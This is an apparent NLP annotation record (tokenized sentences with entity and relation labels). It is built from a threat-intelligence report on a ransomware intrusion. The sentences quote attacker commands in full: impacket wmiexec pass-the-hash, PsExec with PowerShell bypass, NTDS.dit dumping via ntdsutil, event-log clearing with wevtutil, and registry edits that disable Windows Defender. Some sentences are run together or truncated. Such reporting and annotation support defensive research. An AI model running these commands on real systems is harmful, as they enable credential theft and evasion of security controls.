{"doc_key": "075", "sentences": [["If", "users", "have", "not", "already", ",", "they", "should", "download", "the", "latest", "patch", "for", "PrintNightmare", "from", "Microsoft", "."], ["The", "``", "sudo", "''", "command", "was", "used", "to", "obtain", "credentials", "associated", "with", "a", "commercial", "backup", "solution", ",", "likely", "trying", "to", "gain", "access", "to", "backups", "present", "within", "the", "environment.sudo", "-s", "-k", "-p", "[", "Backup", "Prompt", "]", "whoamiWe", "also", "observed", "the", "use", "of", "impacket", ",", "a", "common", "network", "protocol", "manipulation", "tool", "to", "enumerate", "the", "environment", "and", "obtain", "additional", "information", "about", "the", "Active", "Directory", "configuration", "in", "place", "."], ["Below", "are", "some", "examples", "of", "the", "command", "line", "syntax", "used", "for", "the", "performance", "of", "this", "activity.cmd.exe", "/q", "/c", "net", "group", "enterprise", "admins", "/domain", "1", ">", "\\\\127", "."], ["The", "adversaries", "used", "the", "``", "nltest", "''", "command", "for", "this", "purpose.c", ":", "\\windows\\system32ltest.exe", "/dclist", ":", "linux", "[", "HOSTNAME", "]", "Execution", "ATT", "&", "CK", "Technique", ":", "Command", "and", "Scripting", "Interpreter", ":", "Windows", "Command", "Shell", "(", "T1059", "."], ["002", ")", "Similar", "to", "what", "was", "observed", "during", "the", "post-compromise", "reconnaissance", "phase", "of", "the", "attack", ",", "the", "adversary", "used", "impacket", "to", "execute", "Windows", "Management", "Instrumentation", "(", "WMI", ")", "to", "achieve", "command", "execution", "on", "other", "systems", "present", "in", "the", "environment", "."], ["The", "attacker", "also", "used", "the", "``", "proxychains", "''", "utility", ",", "which", "is", "often", "employed", "to", "redirect", "network", "traffic", "during", "penetration", "testing", ",", "red", "teaming", ",", "and", "other", "offensive", "operations.cmd.exe", "/q", "/c", "proxychains", "~/impacket/examples/wmiexec.py", "-hashes", "[", "SHA256", "HASH", "]", "[", "USERNAME", "]", "@", "[", "IP", "ADDRESS", "]", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."], ["By", "implementing", "this", "persistence", ",", "the", "attacker", "can", "regain", "access", "to", "the", "environment", "if", "the", "targeted", "organization", "destroys", "their", "initial", "means", "of", "access", "."], ["Lateral", "movement", "ATT", "&", "CK", "Technique", ":", "Remote", "Services", "(", "T1021", ")", "ATT", "&", "CK", "Technique", ":", "Lateral", "Tool", "Transfer", "(", "T1570", ")", "Once", "operational", "within", "the", "target", "environment", ",", "attackers", "will", "typically", "perform", "reconnaissance", ",", "identifying", "additional", "target", "systems", ",", "and", "then", "move", "laterally", "from", "system", "to", "system", "as", "they", "attempt", "to", "escalate", "privileges", "and", "then", ",", "ultimately", ",", "deploy", "ransomware", "on", "many", "systems", "in", "the", "environment", "."], ["During", "the", "investigation", ",", "we", "observed", "the", "attacker", "leveraging", "Windows", "Remote", "Desktop", "Connections", "to", "pivot", "to", "additional", "systems", "in", "the", "environment", "."], ["This", "was", "typically", "performed", "via", "the", "following", "command-line", "syntax", ":", "C", ":", "\\Windows\\system32\\mstsc.exe", "/v", "[", "HOSTNAME", "]", "The", "attacker", "also", "attempted", "to", "execute", "PowerShell", "scripts", "on", "remote", "systems", "in", "the", "environment", "while", "moving", "system-to-system.cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\", "[", "IPADDRESS", "]", "\\share", "$", "\\p.ps1", "During", "the", "attack", ",", "adversaries", "copied", "and", "executed", "the", "aforementioned", "PowerShell", "script", "on", "multiple", "systems", "across", "the", "environment", "."], ["Credential", "access", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", "(", "T1003", ")", "ATT", "&", "CK", "Technique", ":", "OS", "Credential", "Dumping", ":", "LSASS", "Memory", "(", "T1003", "."], ["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."], ["Disabling", "this", "security", "control", "allows", "attackers", "to", "leverage", "pass-the-hash", "attacks", "and", "hinder", "RDP", "'s", "security", "on", "systems.cmd.exe", "/q", "/c", "powershell", "new-itemproperty", "-path", "hklm", ":", "\\system\\currentcontrolset\\control\\lsa", "-name", "disablerestrictedadmin", "-value", "0", "-propertytype", "dword", "-force", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1", "We", "also", "observed", "the", "attacker", "disabling", "Windows", "Defender", "by", "modifying", "the", "Windows", "Registry", "on", "compromised", "systems", "."], ["This", "was", "performed", "using", "the", "following", "commands", ":", "C", ":", "\\Windows\\system32", "eg.exe", "delete", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender", "/fC", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\Real-Time", "Protection", "/v", "DisableRoutinelyTakingAction", "/t", "REG_DWORD", "/d", "1", "/f", "C", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\SpyNet", "/v", "DisableBlockAtFirstSeen", "/t", "REG_DWORD", "/d", "1", "/f", "We", "also", "observed", "the", "threat", "actor", "attempting", "to", "evade", "detection", "while", "enumerating", "the", "e"], ["In", "this", "case", ",", "the", "Windows", "Command", "Processor", "was", "used", "to", "invoke", "PowerShell", ",", "which", "then", "leveraged", "Invoke-Expression", "(", "IEX", ")", "for", "this", "purpose.cmd.exe", "/Q", "/c", "powershell.exe", "-exec", "bypass", "-noni", "-nop", "-w", "1", "-C", "IEX", "(", "[", "Net", "."], ["This", "data", ",", "once", "exfiltrated", ",", "is", "published", "to", "attacker-controlled", "websites", "that", "are", "commonly", "referred", "to", "as", "``", "data", "leak", "sites", "''", "in", "situations", "where", "the", "victim", "chooses", "not", "to", "pay", "the", "ransom", "demand", "."], ["In", "this", "attack", ",", "we", "observed", "the", "adversary", "attempting", "to", "exfiltrate", "sensitive", "information", "over", "SMB", "(", "TCP/445", ")", "directly", "from", "a", "compromised", "domain", "controller", "."]], "ner": [[[1, 1, "MP"], [13, 13, "MF"]], [[19, 19, "MP"], [26, 26, "TF"], [31, 32, "MP"], [58, 58, "MP"], [69, 69, "MF"], [73, 73, "MF"]], [[88, 90, "MP"], [97, 97, "MP"]], [[110, 110, "MP"], [114, 114, "MP"], [119, 119, "MP"]], [[162, 162, "MP"], [164, 164, "MP"], [167, 169, "MF"]], [[186, 186, "MP"], [191, 191, "MP"]], [[248, 248, "MP"], [250, 252, "MP"], [255, 255, "MF"]], [[261, 261, "MP"], [266, 266, "MF"], [325, 326, "MP"]], [[336, 337, "MP"]], [[397, 397, "MF"]], [[406, 407, "MF"], [412, 412, "MP"]], [[434, 434, "MF"], [438, 438, "SO"]], [[446, 446, "MP"], [452, 452, "MP"]], [[494, 494, "MP"], [498, 498, "MP"]], [[540, 540, "MP"], [547, 547, "MP"]], [[573, 573, "MP"], [578, 579, "MF"], [605, 605, "MP"], [611, 612, "MF"]], [], [[650, 650, "MP"], [654, 654, "SF"], [669, 669, "MF"], [672, 672, "MF"]], [[674, 674, "MP"], [681, 681, "TF"]], [[693, 693, "MP"], [695, 695, "MP"], [702, 702, "MF"]], [[714, 714, "TF"]], [], [], [], [], [[841, 841, "MP"]], [[868, 868, "MP"], [875, 876, "SF"]], [[912, 912, "MP"], [919, 920, "SF"], [931, 932, "MP"], [934, 936, "MP"]], [[943, 943, "MP"], [947, 947, "MP"]], [[988, 988, "MP"], [990, 991, "TP"], [995, 996, "SF"]], [[1050, 1050, "MP"]], [[1064, 1066, "TP"], [1071, 1071, "TP"], [1076, 1076, "MP"]], [[1099, 1099, "MF"], [1108, 1108, "SO"]], [[1135, 1135, "MP"], [1144, 1145, "TF"]]], "relations": [[[1, 1, 13, 13, "WR"]], [[19, 19, 31, 32, "FR"], [31, 32, 26, 26, "RD"], [31, 32, 58, 58, "FR"], [58, 58, 69, 69, "RD"], [58, 58, 73, 73, "RD"]], [[88, 90, 97, 97, "FR"]], [[110, 110, 114, 114, "FR"], [114, 114, 119, 119, "FR"], [110, 110, 162, 162, "CO"]], [[162, 162, 164, 164, "FR"], [164, 164, 167, 169, "EX"]], [[186, 186, 191, 191, "FR"], [186, 186, 446, 446, "CO"], [186, 186, 573, 573, "CO"], [186, 186, 650, 650, "CO"], [186, 186, 868, 868, "CO"], [186, 186, 943, 943, "CO"], [186, 186, 1050, 1050, "CO"]], [[248, 248, 250, 252, "FR"], [250, 252, 255, 255, "EX"]], [[261, 261, 266, 266, "EX"], [261, 261, 325, 326, "FR"], [266, 266, 397, 397, "CO"]], [[336, 337, 266, 266, "RD"], [336, 337, 438, 438, "ST"], [336, 337, 438, 438, "RF"]], [], [[412, 412, 406, 407, "EX"], [412, 412, 434, 434, "WR"], [412, 412, 434, 434, "EX"], [412, 412, 438, 438, "RF"]], [], [[446, 446, 452, 452, "FR"], [446, 446, 494, 494, "CO"], [446, 446, 540, 540, "CO"]], [[494, 494, 498, 498, "FR"]], [[540, 540, 547, 547, "FR"]], [[573, 573, 578, 579, "EX"], [605, 605, 611, 612, "RD"], [605, 605, 611, 612, "WR"]], [], [[650, 650, 654, 654, "RD"], [650, 650, 669, 669, "RD"], [650, 650, 672, 672, "RD"]], [[674, 674, 681, 681, "RD"]], [[695, 695, 693, 693, "FR"], [695, 695, 702, 702, "WR"], [695, 695, 714, 714, "WR"]], [], [], [], [], [], [[841, 841, 714, 714, "RD"], [841, 841, 875, 876, "RD"], [841, 841, 875, 876, "RD"], [841, 841, 875, 876, "WR"]], [[868, 868, 875, 876, "UK"]], [[912, 912, 919, 920, "RD"], [912, 912, 919, 920, "WR"], [912, 912, 931, 932, "FR"], [912, 912, 934, 936, "FR"]], [[943, 943, 947, 947, "FR"], [947, 947, 995, 996, "RD"], [947, 947, 988, 988, "CO"]], [[988, 988, 990, 991, "UK"], [988, 988, 995, 996, "WR"]], [[1050, 1050, 995, 996, "RD"], [1050, 1050, 995, 996, "RD"], [1050, 1050, 995, 996, "WR"], [1050, 1050, 1064, 1066, "FR"]], [[1064, 1066, 1071, 1071, "FR"], [1071, 1071, 1076, 1076, "FR"], [1064, 1066, 1099, 1099, "WR"], [1064, 1066, 1108, 1108, "ST"]], [], [[1135, 1135, 1144, 1145, "WR"]]]}